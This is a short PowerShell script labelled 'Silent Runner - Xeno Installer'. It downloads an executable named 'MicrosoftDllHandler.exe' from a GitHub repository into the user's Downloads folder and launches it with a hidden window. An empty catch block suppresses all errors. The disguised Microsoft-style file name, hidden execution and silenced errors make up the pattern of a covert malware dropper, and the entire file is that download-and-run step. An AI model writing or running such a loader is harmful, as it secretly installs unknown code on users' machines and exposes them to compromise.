# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"

try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
} catch {}
